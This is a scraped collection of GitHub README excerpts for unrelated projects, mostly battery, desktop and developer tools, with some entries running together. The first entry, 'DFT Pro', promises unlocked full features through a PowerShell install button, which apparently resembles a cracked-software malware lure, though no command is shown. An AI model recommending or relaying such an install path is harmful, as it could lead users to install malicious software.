repos.description: DFT Pro: Professional Desktop Platform with Integrated Toolset and Full Feature Access
repos.readme_excerpt:
# DFT Pro: Advanced Desktop Utility Suite for Windows 11

# 📦 PowerShell Install Button

DFT Pro is a desktop application for Windows x64 that consolidates the full range of DFT tooling into a single, locally executed environment. The build ships as a self-contained package with all required components provisioned in advance, eliminating external dependency resolution and enabling immediate operation in offline or restricted infrastructure. Engineered for deterministic behavior, it provides a stable, reproducible configuration suitable for both validation workflows and production deployment. The application exposes its feature set from first launch, with no additional activation or configuration steps required beyond initial.

# 🔧 Requirements

• Windows 10 or Windows 11

• PowerShell 5.1 or newer (already available on Windows)

• No admin rights needed

repos.description: The batteries-included agent harness.
repos.readme_excerpt:
The batteries-included agent harness.

Deep Agents is an open source agent harness — an opinionated agent that runs out of the box. Extend, override, or replace any piece.

• Opinionated — defaults tuned for long-horizon, multi-step work

• Extensible — override or replace any piece without forking

• Model-agnostic — works with any LLM that supports tool calling: frontier, open-weight, or local

• Production-ready — built on LangGraph (streaming, persistence, checkpointing) with first-class tracing, evaluation, and deployment via LangSmith

• Sub-agents — delegate tasks to agents with isolated context windows

• Filesystem — read, write, edit, or search over pluggable local, sandboxed, or remote backends

• Context management — summarize long threads and offload tool outputs to disk

• Shell access — run commands in your sandbox of choice

• Persistent memory — pluggable state and store backends for cross-session recall

repos.description: Status Trio — a native macOS app that combines Wi-Fi, battery, and volume into one compact, configurable status icon for the menu bar, the Dock, or both, inspired by the iPhone Duo combined status bar.
repos.readme_excerpt:
Three system signals. One native macOS status icon — in your menu bar or the Dock.

Want to see it in action first? Open statustrio.lingai.net to simulate every icon state in your browser.

Status Trio is a native macOS status app that combines Wi-Fi, battery, and volume into one compact, configurable icon, shown in the menu bar, in the Dock, or in both. Its popover goes deeper than the icon: a Wi-Fi panel for nearby networks and link details, a Bluetooth panel for paired devices, a Battery Details page, and the audio devices that are playing. It is inspired by the iPhone Duo's combined status bar icon for Wi-Fi, Battery, and Cellular Data, adapted for Mac with Volume instead of Cellular Data.

> Status Trio is an independent project and is not affiliated with Apple.

# Highlights

• One icon, three signals — battery, Wi-Fi, and volume share one icon in the menu bar, the Dock, or both, and a Bluetooth device that is playing can take the middle spot with its own symbol.

repos.description: macOS-style mouse and headset battery indicator card for Windows and MyDockFinder (ATK Mouse & HyperX Headset)
repos.readme_excerpt:
# MyFinder Device Battery

Windows 上的多品牌无线鼠标、耳机与键盘电量卡片，支持 MyDockFinder / MyFinder，也可独立作为系统托盘应用使用。

当前源码版本 1.3.11-beta.22（测试版），适用于 Windows 10/11 x64。原生界面使用系统 .NET Framework，发行包内置设备读取组件，无需用户安装Python、厂商驱动或填写VID/PID。公开可下载版本以 Releases 页面为准，旧版本保留在历史Release中。

1.3.11-beta.22 新增 XIBERIA T7、K03S、K06S 和 T10 的 2.4G 电量候选，均为 C 级，待实机验证。程序内反馈与回复优先走 Cloudflare。读取组件在设备空闲且连续读不到电量时延长查询间隔，面板增加可收起的读取故障提示。ATK A9 Air+ 插线充电时的单卡显示待实机确认。

1.3.11-beta.21 新增迈从 X9 耳机（3837:6045）、R9 耳机（3837:6013）和 V7 / G3 V3 共用 1K 接收器（3837:1016）的 2.4G 电量读取候选，三项均为 C 级，待实机验证。本版还收窄了迈从旧协议查询范围，支持在程序运行期间恢复未提交的反馈草稿，并可左键点击托盘图标找回被遮挡的反馈窗口。

1.3.11-beta.20 新增狼蛛 AULA F99 MAX 的 2.4G 电量候选。共享 05AC:024F 接收器只有在产品串、集合、报告长度与自报固件身份均符合时才会读取。一次只发送两包固定设备信息请求，不使用配置、灯光、配对或固件命令。电量有官方驱动与键盘屏显 68% 的一次对照，充电状态、睡眠唤醒及驱动共存仍待本版实机确认。

1.3.11-beta.19 新增 VGN F1 MOBA 有线接口（3554:F506）的只读电量候选。程序仍要求运行时确认 FF02:0002 和目标输出恰为17字节后才查询；目前只有官方 VGN HUB 的静态协议依据，没有该接口的实机回复或厂商界面对照，充电状态也未实机确认，DPI 不在此适配范围。

repos.description: Cross-platform GUI written in Rust using ADB to debloat non-rooted Android devices. Improve your privacy, the security and battery life of your device.
repos.readme_excerpt:
# Universal Android Debloater Next Generation

> DISCLAIMER: Use at your own risk. We're not responsible for anything that could happen to your devices.

This is a detached fork of the UAD project. This aims to improve privacy and efficiency (energy, speed, memory) by removing unnecessary and obscure system apps. This can also improve security by reducing the attack surface. Read the wiki for more details.

# Documentation

Everything about UAD-ng (and related stuff) can be found on the Wiki, such as:

• Features of this app

• Suggested Android app replacements

• How to get the cutting-edge version by building the source-code

• Weird things OEMs do

• Suggested apps for analyzing APKs

# Privacy

UAD-ng does not collect or transmit any user data. The only external connections are GET requests to GitHub for fetching the package list (crates/uad-core/src/uad_lists.rs) and checking for updates (crates/uad-core/src/update.rs).

[ Screencasts & Tutorials ]

# What is this?

Zellij is a workspace aimed at developers, ops-oriented people and anyone who loves the terminal. Similar programs are sometimes called "Terminal Multiplexers".

Zellij is designed around the philosophy that one must not sacrifice simplicity for power, taking pride in its great experience out of the box as well as the advanced features it places at its users' fingertips.

Zellij is geared toward beginner and power users alike - allowing deep customizability, personal automation through layouts, true multiplayer collaboration, unique UX features such as floating and stacked panes, and a plugin system allowing one to create plugins in any language that compiles to WebAssembly.

Zellij includes a built-in web-client, making a terminal optional.

You can get started by installing Zellij and checking out the Screencasts & Tutorials.

For more details about our future plans, read about upcoming features in our roadmap.

The full full-stack framework for Rust

Topcoat is a modular, batteries-included Rust framework for building full-stack apps. It prioritizes simplicity and productivity. See Learn Topcoat to get started, or the Roadmap for what's coming next.

Early-stage and experimental. Expect breaking changes.

# What makes Topcoat different

# Client reactivity without the boilerplate

Topcoat renders all markup on the server: components can be async and query the database directly, eliminating all the traditional boilerplate needed for a separate API layer. Interactivity does not have to cost a round-trip, though. A $(...) expression is ordinary type-checked Rust that Topcoat evaluates on the server for the initial render and also translates to JavaScript, so it re-runs instantly in the browser. Lenovo Legion Linux Support

# Other language versions of this README file:

This project is not affiliated with Lenovo in any way

Lenovo Legion Linux (LLL) brings additional drivers and tools for Lenovo Legion series laptops to Linux. It is the alternative to Lenovo Vantage or Legion Zone (both Windows only).

It allows you to control features like the fan curve, power mode, power limits, rapid charging, and more. This has been achieved through reverse engineering and disassembling the ACPI firmware, as well as the firmware and memory of the embedded controller (EC).

:star: Please star this repository if this is useful or might be useful in the future.

:star2: My goal is to merge the driver into the main Linux kernel so it comes automatically with Linux and no recompilation is required after a Linux update

:boom: Starring shows that this is useful to me and the Linux community so hopefully a merge into the Kernel is possible.

repos.readme_excerpt:
把表格交给 Codex，把可编辑的科研图带回 Origin 理解数据 · 选择表达 · 定制样式 · 检查交付 三步开始 · 看图选模板 · 复制提示词 · 完整教程 · English

我做 EditaPlot，是想少花一些时间反复调图，多留一些时间讨论数据本身。你把表格和想表达的问题告诉 Codex，它会先说明每列的用途，等你确认后，再调用本机 Origin 绘图和检查结果。

它是一个 Codex Skill，不是独立绘图软件。你仍然可以在 Origin 中继续编辑曲线、坐标轴和图例；配色、线宽与版式也可以在已支持的范围内按你的需求调整。

使用前提：Windows 10/11 x64 实体电脑 + Codex + 本机 Origin/OriginPro。 日常使用不需要提前打开 Origin；Mac、Linux、WSL 和虚拟机暂不支持。

# 先看看能画什么

按实际列展示背景、包络和组分，不补造缺失峰。 同时看组间分布和每个观测，而不只看一根柱子。 使用上游已提供的逐样本 SHAP；绘图层不训练模型。 保留全部 900 个源值与行列顺序，不插值、不自动聚类。

这些示例都用合成教学数据，由真实 Origin 生成，不代表实验或临床结论。点击图片可以看原图。

浏览全部 45 条绘图路线 → 荧光 / EEG 研究信号 English gallery

# 开始使用

# 1 / 安装：这段话交给 Codex

不会 GitHub 也没关系，把下面这段话复制给 Codex：

请下载并保留完整仓库（包括 runtime），运行根目录 editaplot.cmd setup 和 doctor。 优先复用已有的 64 位 Python 3.11/3.12；需要安装 Python 时先问我。 不要安装或修改 Origin，不要修改注册表、DCOM，也不要申请管理员权限或控制鼠标。 完成后用中文告诉我环境是否就绪，再让我提供数据。

也可以下载完整 ZIP，完整解压后让 Codex 在该文件夹里安装。不要只复制 skill/editaplot 子目录，它需要仓库中的绘图引擎。

首次运行缺少兼容 Python 时，先按安装指南完成确认与配置。项目依赖只进入本项目环境，不修改全局 Python。

repos.readme_excerpt:
# MiniWatts

An iPhone and iPad battery and charging monitor built on Apple's private APIs. It reads the device's own power-management sensors — the ones iOS uses to run the charge — and shows what the charger is delivering, how much of it reaches the cell, where the rest goes as heat, and what every temperature sensor in the device is doing while it happens.

> Sideload only. Private APIs mean this can never be on the App Store — you sign > and install it yourself. There is no network code of any kind: nothing it reads > leaves your phone.

# Install

Download the latest MiniWatts-unsigned.ipa from Releases and sign it with your own Apple ID — Sideloadly, AltStore, SideStore and Xcode all do this. A free Apple ID works; the app then expires after seven days and you re-sign it.

Requires iPhone or iPad, iOS 17 or later.

Or add the source to SideStore or AltStore — including the SideStore bundled with LiveContainer — and install from there, so new versions show up as updates:

repos.description: This revolutionary software enables EV battery packs to be easily reused for stationary storage in combination with solar inverters
repos.readme_excerpt:
# Battery-Emulator ⚡🔋

# What is Battery Emulator?

Many manufacturers sell home battery systems to enable homeowners to store power collected from the grid, or renewable sources, to use at times when electricity demand is higher. However almost all of these home battery systems charge a high cost for every kilowatt hour (kWh) of capacity you buy.

At the same time, EV manufacturers have been putting high capacity battery packs into their cars, with no firm plan for what should happen to those batteries if the car is damaged in a crash, or reaches the end of its life as a vehicle.

Battery Emulator enables EV battery packs to be repurposed for stationary storage. It acts as a translation layer between the EV battery and the home inverter. This makes it extremely cheap and easy to use large EV batteries in a true plug'n'play fashion!

repos.description: Fast and flexible physics-based battery models in Python
repos.readme_excerpt:
# PyBaMM

PyBaMM (Python Battery Mathematical Modelling) is an open-source battery simulation package written in Python. Our mission is to accelerate battery modelling research by providing open-source tools for multi-institutional, interdisciplinary collaboration. Broadly, PyBaMM consists of (i) a framework for writing and solving systems (ii) a library of battery models and parameters, and (iii) specialized tools for simulating battery-specific experiments and visualizing the results. Together, these enable flexible model definitions and fast battery simulations, allowing users to explore the effect of different battery designs and modeling assumptions under a variety of operating scenarios.

PyBaMM uses an open governance model and is fiscally sponsored by NumFOCUS. Consider making a tax-deductible donation to help the project pay for developer time, professional services, travel, workshops, and a variety of other needs.

repos.readme_excerpt:
Describe a materials research task. MatOS assembles the scientific assets it needs, runs them as a stateful, checkable workflow, and turns every run into better assets for the next one.

# Contents

• What's in This Edition

# What is MatOS?

MatOS is an agent operating system for materials research. Materials studies run for days, cross literature, computation and experiment, and keep changing as results arrive. Agents for this work have to take on new data and software, keep long tasks on track, and remember what earlier tasks taught them. MatOS builds these capabilities around versioned scientific assets: data, knowledge, tools, skills, roles and workflows.

Research tasks drive the stateful adaptive workflow, the layered scientific asset graph supplies composable capabilities, and execution traces and user feedback become reviewed asset revisions that return to the graph.

repos.readme_excerpt:
# ACol 电池

面向已 root 的 Android 设备的电池与性能监测工具，支持充放电记录、耗电与使用时间分析、电池健康趋势、游戏性能统计和悬浮监视，并为兼容的 OPLUS 设备提供进阶电池与充电设置。

# 安装与使用

应用需要 Android 13 或以上、ARM64 架构，以及可授予应用 root 权限的环境。基本充放电记录可使用兼容的电池接口。详细电池信息和进阶设置依赖设备提供相应的 OPLUS 厂商节点。

安装 APK 后，首次打开时授予 root 权限。应用会检查设备提供的接口，并准备后台记录。部分功能受限时，可按提示继续使用。若提示记录所需的电池读数暂不可用，可先进入应用，稍后在「设置」中开启记录并重试。若初始化失败，可在错误报告中查看原因。

记录开启后，可在「首页」查看实时状态，在「记录」回看充放电曲线和耗电统计，并在「设置」调整采样间隔。关闭应用界面后，后台仍会继续记录。

# 主要功能

• 实时电池状态。首页显示当前电量、剩余容量、电流、电压、温度和功耗。

• 充放电记录。自动划分充电与放电记录，支持按类型和年月筛选。详情页支持曲线缩放和 CSV 导出。可开启「通知栏显示」查看充放电摘要。

• 耗电分析与续航估算。查看亮屏和息屏耗电、分时耗电及应用耗电分布。根据当前电池状态和记录中的使用强度估算剩余能量及可用亮屏时长。

• 使用时间统计。从首页进入日、周、月视图，查看使用时长和应用分布。统计独立于充放电记录，支持删除已结束的整天或整周。

• 游戏性能统计。记录游戏期间的功耗、帧率、最低帧率、CPU/GPU 指标和内存用量。可自定义功耗与性能曲线的采样项目，并与普通记录同时运行。

• 性能监视器。在屏幕顶部显示帧率、CPU、GPU、瞬时功耗、电池电量和温度。可自定义显示项目、大小、颜色阈值、文字颜色、背景不透明度和横屏位置，在设置和控制中心均可独立开关。

• 电池信息与健康趋势。查看电池容量、健康度和循环次数。支持自动或手动保存电池快照、查看历史趋势。

• 进阶设置。在兼容的 OPLUS 设备上查看生效值，调整截止与关机电压、浮充、降温档位、电流计采样间隔和充电电流。支持暂停、禁止和旁路充电，可查看参数说明与详细档位，也可恢复厂商设置。
